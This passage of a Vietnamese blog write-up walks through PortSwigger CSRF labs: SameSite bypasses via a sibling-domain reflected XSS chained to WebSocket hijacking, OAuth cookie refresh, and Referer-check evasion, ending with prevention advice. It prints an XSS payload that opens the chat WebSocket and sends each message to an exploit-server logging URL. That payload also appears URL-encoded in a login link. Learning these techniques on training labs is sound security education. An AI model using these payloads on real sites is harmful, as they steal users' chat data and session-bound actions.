+        return str;
+    }
+
+    function openWebSocket() {
+       return new Promise(res => {
+            if (webSocket) {
+                res(webSocket);
+                return;
+            }
+
+            let newWebSocket = new WebSocket(chatForm.getAttribute("action"));
+
+            newWebSocket.onopen = function (evt) {
+                writeMessage("system", "System:", "No chat history on record");
+                newWebSocket.send("READY");
+                res(newWebSocket);
+            }
+
+            newWebSocket.onmessage = function (evt) {
+                var message = evt.data;
+
+                if (message === "TYPING") {
+                    writeMessage("typing", "", "[typing...]")
+                } else {
+                    var messageJson = JSON.parse(message);
+                    if (messageJson && messageJson['user'] !== "CONNECTED") {
+                        Array.from(document.getElementsByClassName("system")).forEach(function (element) {
+                            element.parentNode.removeChild(element);
+                        });
+                    }
+                    Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
+                        element.parentNode.removeChild(element);
+                    });
+
+                    if (messageJson['user'] && messageJson['content']) {
+                        writeMessage("message", messageJson['user'] + ":", messageJson['content'])
+                    } else if (messageJson['error']) {
+                        writeMessage('message', "Error:", messageJson['error']);
+                    }
+                }
+            };
+
+            newWebSocket.onclose = function (evt) {
+                webSocket = undefined;
+                writeMessage("message", "System:", "--- Disconnected ---");
+            };
+        });
+    }
+})();
+```
+
+Giờ mình phân tích thử nha!! 
+
+Nó sử dụng Websocket trong chat: 
+
+```javascript
+var webSocket = openWebSocket(); 
+```
+
+Và trong `openWebSocket()` có `let newWebSocket = new WebSocket(chatForm.getAttribute("action"));`
+
+Và hàm `sendMessage()` gọi tới hàm `htmlEncode()` để encode input: 
+
+```javascript
+function htmlEncode(str) {
+        if (chatForm.getAttribute("encode")) {
+            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
+                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
+                return lookup[c];
+            });
+        }
+        return str;
+    }
+
+```
+
+Mình thử chat trong box chat này. Và quan sát trong tab Websocket history. 
+
+![image](/assets/images/PortSwigger/csrf/image40.png)
+
+Sau đó mình gửi nó sang repeater. 
+
+![image](/assets/images/PortSwigger/csrf/image41.png)
+
+Thì ra đây là dấu hiệu khi bắt đầu 1 WebSocket.
+
+Như vậy, quan sát Websocket history để bắt đầu thì sẽ có client gửi tới server `READY`.
+
+![image](/assets/images/PortSwigger/csrf/image42.png)
+
+Thì chạy thì nó trả về 1 response chứa 
+
+![image](/assets/images/PortSwigger/csrf/image43.png)
+
+Tuy nhiên, ở đây nó đã mở ra 1 chat mới. Bởi vì nó lấy file javascript từ domain là `cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net`
+
+Khi truy cập `/` thì nó chuyển hướng thành  1 trang login. 
+
+![image](/assets/images/PortSwigger/csrf/image44.png)
+
+Với các phần quan trong header là: 
+
+![image](/assets/images/PortSwigger/csrf/image45.png)
+
+```HTTP 
+Set-Cookie: session=XH1lyeJKQkrj8TLLQk58lLW7d3aI6hxM; Secure; HttpOnly; SameSite=Strict
+``` 
+
+Thì ở đây nó đã được 1 session mới cho mình và cả `SameSite=Strict` thì nó yêu cầu trình duyệt ko gửi đi bất kỳ request cross-site nào. 
+
+Nên bây giờ mình thử login với payload `<h1>test</h1>`. 
+
+![image](/assets/images/PortSwigger/csrf/image46.png)
+
+Nó hoàn toàn bị dính Reflected XSS! 
+
+Và sau một hồi thì mình trigger bằng GET. 
+
+![image](/assets/images/PortSwigger/csrf/image47.png)
+
+Nó chuyền payload vào thì được như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image48.png)
+
+Tổng kết lại thì mình tìm thấy: 
+- 1 CSWSH trong live chat 
+- 1 Reflected XSS trong domain `cms` 
+
+Thì theo ở đã biết thì `cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net` thì nó là một **same-site**. 
+
+Từ đây mình có thể dùng XSS để làm CSWSH mà ko bị hạn chế về SameSite: 
+
+CSWSH payload: 
+```HTML
+<script>
+    var webSocket = new WebSocket('wss://0aa1000c03396524806d1c66009b000e.web-security-academy.net/chat');
+    webSocket.onopen = function() {
+        webSocket.send("READY");
+    };
+    webSocket.onmessage = function(event) {
+        fetch('https://exploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net/log?'+event.data, {method: 'GET'});
+    };
+</script>
+``` 
+
+Sau đó, mình URL encode payload CSWSH: 
+
+```
+%3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E
+``` 
+
+Tiếp theo cái payload XSS tại `cms` là: 
+
+```
+http://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net/login?username=3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=123
+```
+
+Cuối cùng, mình tạo ra 1 HTML payload dựa trên cái payload XSS ở trên: 
+
+```javascript
+<script>
+    document.locaton = 'http://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net/login?username=3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=123)';
+</script>
+```
+
+![image](/assets/images/PortSwigger/csrf/image49.png)
+
+Sau đó nó trả về nội dung chat mà chẳng may trong đó có tài khoản. 
+
+![image](/assets/images/PortSwigger/csrf/image50.png)
+
+## Bypass SameSite Lax bằng cách sử dụng cookie vừa được tạo ra
+
+Cookie `SameSite=Lax` thường ko được gửi trong POST từ trang khác (cross-site POST). 
+Nhưng **Chrome có ngoại lệ**: Nếu cookie mới được tạo (vừa set) và ko có thuộc tính SameSite rõ ràng, thì: 
+- Chrome tự set `SameSite=Lax` mặc định
+- Nhưng ko áp dụng hạn chế ngay lập tức 
+
+➡️ Trong 2 phút đầu sau khi cookie được set, nó vẫn được gửi trong các POST cross-site. 
+👉 Kẻ tấn công lợi dụng trong 2 phút đầu để thực hiện CSRF. 
+
+Việc mà khai thác trong 2 phút đầu này lại ko thực tế lắm. Nhưng mà nếu tìm được 1 gadget trên web cho phép buộc trình duyệt của nạn nhân nhận cookie phiên mới, từ đây mình chủ động làm mới cookie để tấn công CSRF ➡️ ví dụ là sau khi login lại bằng OAuth, thì:
+- ✨ Cookie mới nằm trong 2 khoảng 2 phút => tấn công CSRF thành công. 
+
+Để thực hiện điều này: 
+- Redirect người dùng tới trang login OAuth (ở top-level ➡️ trình duyệt gửi cookie OAuth)
+- OAuth xử lý xong ➡️ cấp session mới 
+- Chuyển hướng người dùng lại site của attacker
+- Attacker thực hiện CSRF trong thời gian đ 
+
+Có thể mở tab mới để làm mới cookie mà không rời khỏi trang tấn công, nhưng trình duyệt sẽ chặn popup nếu không có thao tác thủ công từ người dùng. Ví dụ, đoạn code mở popup sau đây sẽ bị trình duyệt chặn theo mặc định: 
+
+```javascript
+window.open('https://vulnerable-website.com/login/sso');
+```
+
+Từ đây mình có thể wrap nó trong sự kiện `onclick`
+
+```javascript
+window.onclick = () => {
+    window.open('https://vulnerable-website.com/login/sso');
+}
+```
+Bằng cách này, phương thức `window.open()` chỉ được gọi khi người dùng nhấp chuột vào một vị trí nào đó trên trang.
+
+## LAB09 
+
+Lab này có chức năng `change-email`, và được cung cấp 1 account là `wiener:peter`
+
+![image](/assets/images/PortSwigger/csrf/image51.png)
+
+Và tài khoản này được xác minh. 
+
+![image](/assets/images/PortSwigger/csrf/image52.png)
+
+Quan sát trong thì thấy có 1 request là `/oauth-callback?code=`
+
+![image](/assets/images/PortSwigger/csrf/image53.png)
+
+Trong response của nó thì có Set-Cookie lại ko có thuộc tính SameSite 
+
+```HTTP
+Set-Cookie: session=6baEDxaGayg0jARt1sfVlHCDN1gF7mKa; Expires=Wed, 06 Aug 2025 23:09:47 UTC; Secure; HttpOnly
+```
+
+Và quan sát trong phần request và response thì có hai trường cookie session đều khác nhau. Nghĩa là `oauth-callback` có thể đã refresh lại cookie session này. 
+
+Sau đó thì nó sẽ chuyển mình về my-account. Mình có thể thực hiện chức năng `change-email` bình thường.
+
+![image](/assets/images/PortSwigger/csrf/image54.png)
+
+Quan sát trong request hay response cũng đều ko có csrf token. 
+
+Do nó ko set SameSite thì trong mặc định nó sẽ được gán là Lax mà Lax thì nó sẽ ko gửi ra bằng POST. 
+
+Nếu vậy mình thử với payload bình thường xem có thể thay đổi được email hay ko ? 
+
+![image](/assets/images/PortSwigger/csrf/image55.png)
+
+Khhi mình thực hiện payload này và view exploit thì quan sát nó trả về rất nhanh => cho nên là nó ko thể khai thác CSRF. Vì mình cần loggin lâu hơn 2 phút để nó chưa gán **SameSite=Lax**
+
+Khi truy cập `/social-login`, quá trình OAuth sẽ tự động được khởi tạo lại. Nếu mình vẫn còn phiên login với máy chủ OAuth, nó diễn ra mà ko có bất kỳ tương tác nào. 
+
+Như vậy nếu mình truyền payload như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image56.png)
+
+Nghĩa là lợi dụng vào trong flow OAuth sẽ tạo ra 1 session mới, mà trong lúc tạo mới thì 2 phút nó sẽ ko gán SameSite. 
+
+Nó hoàn toàn thành công khi quá trình diễn ra ít hơn 2 phút và phải trình duyệt ko được block popup. 
+
+Nên mình sẽ dùng gói cái payload như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image57.png)
+
+## Bypass cơ chế phòng chống CSRF dựa trên header Referer 
+
+Dùng Referer để chống CSRF không an toàn → vẫn bị attacker vượt qua bằng nhiều cách.
+
+### Referer header 
+
+**Header Referer** cho biết trang nguồn gửi request, nhưng nó là tùy chọn và có thể bị xóa hoặc thay đổi (ví dụ do Referrer-Policy) nên không đáng tin cậy để bảo vệ CSRF.
+
+## Việc xác thực Referer phụ thuộc vào việc header này có tồn tại 
+
+Nếu ứng dụng bỏ qua xác thực khi thiếu Referer, attacker có thể khai thác bằng cách làm trình duyệt không gửi Referer, ví dụ thông qua thẻ <meta> đặt chính sách no-referrer
+
+```HTML
+<meta name="referrer" content="never">
+``` 
+
+### LAB10 
+
+Ở lab này mình được cung cấp 1 account `wiener:peter`
+
+![image](/assets/images/PortSwigger/csrf/image58.png)
+
+Thì mình cũng thử gửi payload đến server exploit như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image59.png)
+
+Thì mình nhận được 1 thông báo như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image60.png)
+
+Như vậy server dựa trên Referer để xác thực. 
+Cho nên mình thêm payload như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image61.png)
+
+## Xác thực Referer có thể bị phá vỡ 
+
+Nếu ứng dụng chỉ kiểm tra Referer bằng cách so sánh chuỗi bắt đầu, attacker có thể bypass bằng cách dùng subdomain giả mạo, ví dụ `example.com.attacker.com`.
+
+```URL
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+```
+
+Nếu ứng dụng chỉ kiểm tra Referer có chứa tên miền, attacker có thể chèn domain vào phần query hoặc path của URL để bypass. 
+
+```URL
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+``` 
+
+Do nhiều trình duyệt mặc định loại bỏ query string khỏi Referer, attacker cần thêm header Referrer-Policy: unsafe-url để đảm bảo toàn bộ URL được gửi, giúp bypass kiểm tra dựa trên substring.
+
+### LAB11 
+
+Lab này cũng được cung cấp 1 account `wiener:peter` 
+
+![image](/assets/images/PortSwigger/csrf/image62.png)
+
+Khi thử change-email thì có trường Referer như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image63.png)
+
+Nếu mình thay đổi trường này thì sao? 
+
+![image](/assets/images/PortSwigger/csrf/image64.png)
+
+Như vậy mình thêm 1 tham số GET thì như thế nào? 
+
+![image](/assets/images/PortSwigger/csrf/image65.png)
+
+Yah nó vẫn hoạt động! 
+
+Nếu như vây thì mình có thể dùng 1 hàm trong Js được gọi là `history.pushState()` dùng để thay đổi URL trên thanh địa chỉ mà không tải lại trang và cho phép quản lý lịch sử trình duyệt một cách linh hoạt.
+
+![image](/assets/images/PortSwigger/csrf/image66.png)
+
+## Cách phòng chống CSRF 
+
+1. Dùng CSRF Tokens 
+- Cách phòng thủ chắc chắn nhất là sử dụng CSRF token.
+- Yêu cầu cơ bản của token:
+    - Có độ ngẫu nhiên cao, không thể đoán trước.
+    - Phải liên kết chặt chẽ với phiên đăng nhập của người dùng 
+    - Được xác thực nghiêm ngặt ở mọi request liên quan đến hành động nhạy cảm. 
+
+- Cách truyền token thường dùng: 
+    - Thêm dưới dạng input ẩn trong form HTML, sử dụng method POST để truyền dữ liệu.
+    - Không nên đưa token vào query string, vì có thể bị ghi log, lộ qua header Referer, hoặc hiển thị trong URL.
+    - Có thể đặt token trong custom header (qua JS) như **X-Csrf-Token**, tuy an toàn nhưng yêu cầu dùng XHR và có thể phức tạp hơn.
+- Tránh dùng cookie để truyền CSRF token - dễ bị khai thác. 
+
+2. Áp dụng Strict SameSite Cookie 
+- Cấu hình cookie với SameSite=Strict để ngăn chặn CSRF hiệu quả hơn so với Lax, vì Strict không gửi cookie trong request cross‑site.
+- Hãy tự đặt thuộc tính SameSite thay vì để trình duyệt mặc định xử lý (vì Chrome chỉ mặc định là Lax).
+- Trường hợp cần dùng cookie cross-site (ví dụ OAuth/SSO), chỉ nên dùng Lax khi thực sự cần thiết và hiểu rõ rủi ro. 
+
+3. Cảnh giác vời cross-origin, same-site attacks. 
+- Even khi chế độ SameSite được cấu hình đúng, các tấn công cùng site nhưng khác origin vẫn có thể bypass bảo vệ.
+- Ví dụ: nếu có XSS trên sub-domain, attacker có thể tấn công lên domain chính thống.
+- Vì vậy, nên tách biệt nội dung không tin cậy và nội dung nhạy cảm (ví dụ lưu file upload trên domain khác) để giảm rủi ro 
+
+
